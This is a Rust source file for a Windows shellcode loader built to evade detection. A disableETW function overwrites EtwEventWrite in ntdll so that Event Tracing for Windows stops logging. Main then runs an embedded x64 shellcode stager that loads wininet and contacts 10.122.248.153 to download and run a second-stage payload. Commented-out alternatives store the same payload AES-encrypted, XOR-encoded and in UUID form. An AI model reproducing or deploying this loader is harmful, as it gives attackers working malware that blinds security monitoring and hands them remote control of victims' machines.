extern crate winapi;

mod Basic_Shellcode_Loder;
mod AesEnDe;
mod UUidShellcodeLoder;
mod tools;
use UUidShellcodeLoder::UUidLoderAndObfuscation;
use base64::decode;
use Basic_Shellcode_Loder::{HideImportTableLoder, BasicShellcodeLoder};
use tools::StrToU8Array;
use std::{
    ffi::CString,
    {mem, u8}
};
use winapi::{
    shared::{
        minwindef::LPVOID,
        ntdef::{HANDLE, PVOID, ULONG},
        basetsd::SIZE_T
    },
    um::{
        libloaderapi::GetModuleHandleA,
        processthreadsapi::{GetCurrentProcess, FlushInstructionCache},
        memoryapi::WriteProcessMemory,
        winnt::PAGE_READWRITE
    },
    ctypes::{c_void}
};



// const iv : [u8;16]=[160, 59, 42, 145, 118, 130, 125, 90, 138, 69, 35, 30, 12, 157, 118, 160];


type TNtVirtual = extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAddress: *mut PVOID,
    NumberOfBytesToProtect: *mut SIZE_T,
    NewAccessProtection: ULONG,
    OldAccessProtection: *mut ULONG,
) -> i32;

fn disableETW () {
    let patch: &[u8; 4] = &[0x48, 0x33, 0xc0, 0xc3]; // xor rax, rax; ret
    let mut old_protect: ULONG = 0;
    let size: usize = patch.len();

    let h_current_proc = unsafe { GetCurrentProcess() };
    
    let s_etw_event_write_name = CString::new(hex::decode("4574774576656e745772697465").expect("")).expect("CString::new failed");
    let ntdlName = CString::new(hex::decode("6e74646c6c2e646c6c").expect("")).expect("CString::new failed");
    let ntProName = CString::new(hex::decode("4e7450726f746563745669727475616c4d656d6f7279").expect("")).expect("CString::new failed");
    
    let h_ntdll = unsafe {GetModuleHandleA(ntdlName.as_ptr() as *const i8)};
    
    // 找到EtwEventWrite函数在虚拟内内存中的地址
    let p_event_write = unsafe {
        winapi::um::libloaderapi::GetProcAddress(
            h_ntdll,
            s_etw_event_write_name.as_ptr() as *const i8,
        )
    } as *const ();


    let far_proc = unsafe {
        winapi::um::libloaderapi::GetProcAddress(
            winapi::um::libloaderapi::GetModuleHandleA(ntdlName.as_ptr() as *const i8),
            ntProName.as_ptr() as *const i8,
        )
    }as *const ();

    let o_nt_virtual = unsafe {
        mem::transmute::<*const (), TNtVirtual>(far_proc)
    };

    // 将内存属性改成PAGE_READWRITE,这里size是我们需要修改内存的大小。
    unsafe {
        o_nt_virtual(
            h_current_proc,
            p_event_write as *mut PVOID,
            size as *mut usize,
            PAGE_READWRITE,
            old_protect as *mut ULONG,
        );
    }

    // 修改内存
    unsafe {
        WriteProcessMemory(h_current_proc, p_event_write as *mut c_void, patch.as_ptr() as LPVOID, size, old_protect as *mut usize);
    }

    // 恢复内存属性
    unsafe {
        o_nt_virtual(
            h_current_proc,
            p_event_write as *mut PVOID,
            size as *mut usize,
            old_protect,
            old_protect as *mut ULONG,
        );
    }

    unsafe {
        FlushInstructionCache(h_current_proc, p_event_write as *const _, size);
    }

}


fn main() {
    // let ct = hex::decode("e7c1543664a74b7514b8e66a7570017843f2aaca9004f0d6b74ae25a341274cce6944dc22b2205adb569e32ab00d8c2771bf1e51248acf3cb38c5251517231d1f021c38378ae5b2c0071961bfd7787acd83cd1574fe985003e7c55ebb2d9bf052db2eea4bf7fdf9161fa6126e4cbd1c5e685374974e12fe52c4893c855bd6b5ce2f2c36f845e0db286199cf9b2d75c7442e3a9ecf61abc7944cf4229aaea173aed8b35023c48b9340f77ac92812d44757c4300e8840cc4652923b91e1d115183e6af9e871ab9c5182c2769d97f04c50b72d36f94f242bca7d9a94560472bc16bb2dc513f8eddb013e8a12a73ad5643747917fc6313623d9261bccb23437f439dac429b6c5ebe2e2804bc9b37c5843805c45f542cc39e9cf55f0397560471d8c74210e279361ab4a0e721afd9f2851800bb6ad3e1312ff720d4ac6051d82ff8e9eca564e74d1380a95a345f753a0e07960833ee92583249d74dc734624524eaab263cfee6da1429ae80732c3ccf745e9cd6284aba16e2a4f9f59b87c8b52c5f3e647e32b4a7dffb4c0555b4327b21616e96847a156d4ac0a096a615211cdfe0998ccd0c1170508ac7f4e91006351631ee5b558fe7d21b8b11b7dc36681ecfcd7cce22af4f7e04fd222a69884f6df75759a2f41241856c6258c37ad3f2913d02c63dab5f8cff4aad3633c0220e4c9a854635db0fc395a5bae070edf86f364fe7ed590b114487668f2e7f93e9650030a2c8a030dbc6c1721177b8eebe70e5f4f7b78483f2529bccff8d8d1a7174f663dedc680e434e7cb44d50a93d7d32d1ce0651ecf3c485cdb60a5084914e7559e6e2e51238e6cd6d1c663003fd1a2e82281b5d19f599947c24d720a55ffae2193a820c7bb76ebcf934cc87b367f94839b9cca1930d8cf988403eb2351974bab7ec0f4761c46237b7be838e61038f92f40d16c2b7d96ecbff98c7c7a9a4ca1213f4c070cd35722ff50c5b74b2b4a09e981c4ee21b232e1fd6fb8adc4799a1eebb2d6f65e20c862de980124bf53c44337212e9465ea75aeb56a5d645ff7802a4b7aabbd42276631cb16d5ebc94913cc09f5c321a4ba28e326f5080914f3508e050086d8d6ad4c5f4fb21746d010e71ed03f40b6bb6ded0e7392bfe7be40b70ec0568e9de7daf4b90f303a9fab563234bada1a2fd99d8dc4c012c7d36cb9d1be26b9d9c35b73f0ff66c2575409555220517c1cb990ddec25fe7d6c9935f3c66e0db158e8b4faac10bb0e0e17fce626ab0f4e65d0a3bc66bf600d228d96037350d0a40282d28487135b67669577b5e1e3d446f079199852ccb332e53e5713109a74f00bdee7717f07b3e18a6382c57e611f9d05d227e5e5819ee9b101a603bb0489199928507dcae3f45b89eb7c6aa5d52156b6483698548fddaf754768a41c9c1e2a511141e85420e0c7e7373839ded69ea097b565aec0c54d977cc050b0e9a1bbb9582d236676940de090e42c6ab5953df1fbdcf843f42e284ceb808b0a0edbb83c840056b20254fe4701e0309bce4e102c043024a22c0808072240a4918b8f8cee48fb30b6b4f4d1b4caac348a1e3da203434fc546149f38b0b8e1de1e11f1e85040438f73dd374edd266be4ff501ab6daa41ce3f66b4a249535810ff92a0e4168484d49bb5723c84c6552049f9ad0b1ec62dcfaff9a517cb26bc14fd76fea59aee36dc").expect("");
    // let pt = decrypt(&ct, iv);
    // let pt = "nSzujZ7Z+jNhZCw4L2FgYjcsXLsLeblhASzmO3Z5uWFBLOYbPnk9hCsuIFineQPzzVgMFWwdEnKgrWAob/DQ3jMlPCHlYxK4I1glaL5Xs0t5b28cHLqyu2FkbSHr8UZUKWW9OeV5KnfqJE0gb+HRZSmbpCjlBbp7YLIgWKd5A/PNJaygY3Az8lmEGJgiMn4XaSFUuBvpanfqJEkgb+FUcupoJS3lcS56YLQs4mq5ejKxJTUoNm9raSA8LDAva3qwjUQsO5HRanI4PiXifNh9zJ6bMANueIxECAoEBwtFMnI3LeSPIrjDctsoGk9pzud7UK0lWLx8A/MsVaQoPnBictteOxDJzufYEj4l4K9wijl7ZG0kX/hzYiA1B2ovYHOJNu3yr5Hk2Wo6LOSoJgDgeui8IFinY1ozYyTpOzxwiNg0SlaWu3m79SnnrjkEO2176JUl4LR49fOem5KWIwD7YTMl10RoKUnMtOGtZuusMzNhLJKmYbW+MmFkhrqH1TMzYYzPlpHOHWMDNjRpi/BopR7cKbhwdPPIJaRraVz6/7GrR62EeUnLDzxD9AqP+z8KGzKHm8VQsCG3+aAEwi9NwyS8X+0DmgkN16G2umjR/3y5osCpjDFnQAQWQCgJVFxHW0QgBhRYXl8AS1lHXhEaUA4JHQgaWFBfBF9NJD14dxNZSl1STmZbXQULGhpOf2YTVEpcUk5lQFoFAQMdQQUcA1pEQycrZRJwLTZNW0ABHAZRU19eRzw4M7xXBW5vMXlz1N1A1+u+okelD4EDH6l6F+1JE8OAuo6+7U/MVCtEKPLNVRIO0DG7kPe0Sk+pKPStVR3/vjxLLRoimuOPujJ9MWqQrenSwLTQ93tS5gTlssccbgu7HUFMlxtuAE/2oq1WmdU8n/6r64s9hY/S5Kdly8nYFyOaCdNdZiq4HBIrsuA+N7/qUfxC4cYG1qFSfc+avqDlEEUYMAvyxsfd2r5Fp3cCB0doESrRd9EcGDjM2X7COsY26AQxhO8W1fIvBgpIeYe47xAxc42R0c8/keR6AqjebWkuMXOLYXRtaS+IcjNhZCzTNpVh1p6xJfo9Ynq6hizkmCa46HLZZE1pbni7yiDef//n083mKeepSevxRoUH72ohb/K38xSzNTE2eTczYWRtOa3Zrc6em1xZQAAAAU9WWVFAAAcAYXZZPxY=";
    // let s = decode(pt).expect("");
    // let key = "admin123".to_owned();
    // let key_bytes = key.as_bytes();
    // let mut s2 = vec![0; s.len()];
    // for i in 0..s.len() {
    //     s2[i] = s[i] ^ key_bytes[i % key_bytes.len()];
    // }
    // disableETW();
    // HideImportTableLoder(&s2);

    let code = StrToU8Array("\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x75\\x72\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x4f\\xff\\xff\\xff\\x5d\\x6a\\x00\\x49\\xbe\\x77\\x69\\x6e\\x69\\x6e\\x65\\x74\\x00\\x41\\x56\\x49\\x89\\xe6\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x48\\x31\\xc9\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x41\\x50\\x41\\x50\\x41\\xba\\x3a\\x56\\x79\\xa7\\xff\\xd5\\xeb\\x73\\x5a\\x48\\x89\\xc1\\x41\\xb8\\x0a\\x1a\\x00\\x00\\x4d\\x31\\xc9\\x41\\x51\\x41\\x51\\x6a\\x03\\x41\\x51\\x41\\xba\\x57\\x89\\x9f\\xc6\\xff\\xd5\\xeb\\x59\\x5b\\x48\\x89\\xc1\\x48\\x31\\xd2\\x49\\x89\\xd8\\x4d\\x31\\xc9\\x52\\x68\\x00\\x02\\x40\\x84\\x52\\x52\\x41\\xba\\xeb\\x55\\x2e\\x3b\\xff\\xd5\\x48\\x89\\xc6\\x48\\x83\\xc3\\x50\\x6a\\x0a\\x5f\\x48\\x89\\xf1\\x48\\x89\\xda\\x49\\xc7\\xc0\\xff\\xff\\xff\\xff\\x4d\\x31\\xc9\\x52\\x52\\x41\\xba\\x2d\\x06\\x18\\x7b\\xff\\xd5\\x85\\xc0\\x0f\\x85\\x9d\\x01\\x00\\x00\\x48\\xff\\xcf\\x0f\\x84\\x8c\\x01\\x00\\x00\\xeb\\xd3\\xe9\\xe4\\x01\\x00\\x00\\xe8\\xa2\\xff\\xff\\xff\\x2f\\x5a\\x62\\x32\\x6f\\x00\\xfd\\xbd\\x5f\\x30\\xe8\\xef\\xdc\\x81\\x96\\x3c\\x04\\x7d\\xc4\\x1f\\xd2\\x4b\\x4a\\xb2\\x96\\x76\\x01\\x6b\\x32\\xbf\\x79\\x75\\x37\\x84\\xa5\\x2b\\x50\\x86\\x08\\x1c\\x15\\xee\\x4e\\x78\\xa8\\xc8\\x8f\\x62\\x95\\x6c\\xf1\\x94\\x90\\x6d\\xe9\\x41\\x9d\\xf7\\x70\\xa2\\x34\\xac\\xdd\\x77\\xd7\\x02\\x38\\x5c\\xef\\xdc\\x89\\x4a\\x9c\\xc4\\xa8\\xf2\\x8b\\xcd\\xab\\x00\\x55\\x73\\x65\\x72\\x2d\\x41\\x67\\x65\\x6e\\x74\\x3a\\x20\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x34\\x2e\\x30\\x20\\x28\\x63\\x6f\\x6d\\x70\\x61\\x74\\x69\\x62\\x6c\\x65\\x3b\\x20\\x4d\\x53\\x49\\x45\\x20\\x37\\x2e\\x30\\x3b\\x20\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73\\x20\\x4e\\x54\\x20\\x36\\x2e\\x30\\x29\\x0d\\x0a\\x00\\xb6\\xdd\\x59\\xac\\xfe\\x9f\\x3a\\xf6\\x10\\xe2\\xe3\\xe2\\x5a\\x7c\\x63\\xc6\\x17\\x3d\\x53\\x71\\xf0\\x2f\\x43\\xf9\\xde\\xc2\\xdd\\x1a\\xeb\\x40\\x9f\\x15\\x4b\\xc0\\xc5\\xe1\\xc1\\xf9\\x8d\\x0e\\x83\\x67\\x9b\\x93\\x4c\\x2e\\xcd\\x5b\\x8c\\x55\\x4e\\xec\\xb6\\x57\\xca\\x9c\\x93\\x32\\x1f\\x43\\x46\\x19\\x15\\x84\\xa0\\x61\\xd8\\x16\\xe0\\x54\\xf8\\xb1\\xdc\\xf3\\x96\\xb1\\xf1\\x90\\xbd\\x96\\x88\\x7b\\xe6\\x62\\x47\\x2c\\x23\\x62\\x14\\xe4\\x58\\xf8\\x31\\xb2\\xdc\\xdc\\x4c\\x7a\\x40\\x69\\x4f\\x35\\x3e\\xa3\\x7c\\xf5\\x89\\x4b\\x05\\x8a\\x22\\xfd\\x59\\x15\\x82\\x21\\x63\\x0d\\x43\\x69\\x07\\xa7\\xcb\\xe8\\x4e\\x80\\x95\\xa6\\x8d\\x1d\\x02\\x56\\x7d\\x56\\xe1\\x0a\\x12\\x97\\x2b\\xcb\\x29\\xfd\\x28\\x8d\\x27\\xbe\\xc5\\x30\\x47\\x75\\xce\\xfb\\x24\\xb5\\xf2\\x28\\x3a\\x8f\\x94\\xb8\\x74\\x1b\\xd9\\x52\\x49\\x72\\xa2\\xb6\\xea\\x08\\x59\\xc5\\x50\\xea\\xb6\\xa6\\x32\\x6f\\x68\\xdd\\x0b\\x26\\x9e\\xf6\\xa2\\xb4\\xe8\\x12\\x78\\xe3\\x26\\x5f\\x42\\x40\\x24\\x10\\x65\\x19\\x11\\x01\\x86\\xf8\\x5f\\xb0\\x31\\xe6\\x71\\xdc\\x61\\x9f\\x3c\\x06\\xa4\\x78\\x69\\x5e\\x05\\x7c\\x98\\x31\\x03\\x57\\xfc\\x16\\xbe\\x2d\\x0c\\xa1\\x7f\\x49\\x6f\\x62\\xb6\\xf9\\x12\\x56\\x84\\x23\\x00\\x41\\xbe\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x48\\x31\\xc9\\xba\\x00\\x00\\x40\\x00\\x41\\xb8\\x00\\x10\\x00\\x00\\x41\\xb9\\x40\\x00\\x00\\x00\\x41\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x93\\x53\\x53\\x48\\x89\\xe7\\x48\\x89\\xf1\\x48\\x89\\xda\\x41\\xb8\\x00\\x20\\x00\\x00\\x49\\x89\\xf9\\x41\\xba\\x12\\x96\\x89\\xe2\\xff\\xd5\\x48\\x83\\xc4\\x20\\x85\\xc0\\x74\\xb6\\x66\\x8b\\x07\\x48\\x01\\xc3\\x85\\xc0\\x75\\xd7\\x58\\x58\\x58\\x48\\x05\\x00\\x00\\x00\\x00\\x50\\xc3\\xe8\\x9f\\xfd\\xff\\xff\\x31\\x30\\x2e\\x31\\x32\\x32\\x2e\\x32\\x34\\x38\\x2e\\x31\\x35\\x33\\x00\\x12\\x34\\x56\\x78");
    disableETW();
    BasicShellcodeLoder(&code);
    
//   let uuidshellcode = &vec!["e48348fc-e8f0-00c8-0000-415141505251", "d2314856-4865-528b-6048-8b5218488b52", "728b4820-4850-b70f-4a4a-4d31c94831c0", "7c613cac-2c02-4120-c1c9-0d4101c1e2ed", "48514152-528b-8b20-423c-4801d0668178", "75020b18-8b72-8880-0000-004885c07467", "50d00148-488b-4418-8b40-204901d0e356", "41c9ff48-348b-4888-01d6-4d31c94831c0", "c9c141ac-410d-c101-38e0-75f14c034c24", "d1394508-d875-4458-8b40-244901d06641", "44480c8b-408b-491c-01d0-418b04884801", "415841d0-5e58-5a59-4158-4159415a4883", "524120ec-e0ff-4158-595a-488b12e94fff", "6a5dffff-4900-77be-696e-696e65740041", "e6894956-894c-41f1-ba4c-772607ffd548", "3148c931-4dd2-c031-4d31-c94150415041", "79563aba-ffa7-ebd5-735a-4889c141b80a", "4d00001a-c931-5141-4151-6a03415141ba", "c69f8957-d5ff-59eb-5b48-89c14831d249", "314dd889-52c9-0068-0240-84525241baeb", "ff3b2e55-48d5-c689-4883-c3506a0a5f48", "8948f189-49da-c0c7-ffff-ffff4d31c952", "2dba4152-1806-ff7b-d585-c00f859d0100", "cfff4800-840f-018c-0000-ebd3e9e40100", "ffa2e800-ffff-502f-6252-5900e5c15a96", "d144b87f-451e-fbc1-44c0-060032cbcd82", "edc023ca-7817-3cf9-5d27-9963e1ca0d39", "f2ea567a-61ab-1282-d69d-cd6dac1e7ff0", "8432d845-ab6d-3e3b-b6c5-dbd306e0cd4f", "c0adc6d8-00e2-7355-6572-2d4167656e74", "6f4d203a-697a-6c6c-612f-342e30202863", "61706d6f-6974-6c62-653b-204d53494520", "3b302e38-5720-6e69-646f-7773204e5420", "3b312e35-5420-6972-6465-6e742f342e30", "4e2e203b-5445-4320-4c52-20322e302e35", "37323730-0d29-000a-dd33-680701004b40", "be2db9b5-8f85-7490-c46b-ec6a71984824", "aa7e2d8c-8bee-8dbc-8c2b-a13d45751ac1", "677f31ac-00be-a389-96d0-2726c719c69e", "d7927934-7a52-291f-43fe-8ee6d4034f02", "80c0f40b-f1bc-e386-961f-3f8f6ad480f4", "d2660a7d-7073-a47e-7a0a-6d2698939f65", "f651b1f8-9a90-b8d9-5ce1-e2bb8a9657f8", "4a7abca8-38f4-6ee1-074e-d5757c1a80d3", "83d2535f-cd3f-d270-a762-bbc83c4cfda9", "7988c4df-292b-3802-93a2-aab4b48f7794", "2e6a6616-2006-e218-16b5-717156fdeb4d", "5fab5ea3-3586-b703-8e72-b89b4137387b", "86d5e318-007e-be41-f0b5-a256ffd54831", "0000bac9-0040-b841-0010-000041b94000", "ba410000-a458-e553-ffd5-489353534889", "f18948e7-8948-41da-b800-2000004989f9", "9612ba41-e289-d5ff-4883-c42085c074b6", "48078b66-c301-c085-75d7-585858480500", "50000000-e8c3-fd9f-ffff-31302e313232", "3834322e-312e-3335-0012-345678000000"];
//   UUidLoderAndObfuscation(uuidshellcode);
    
}





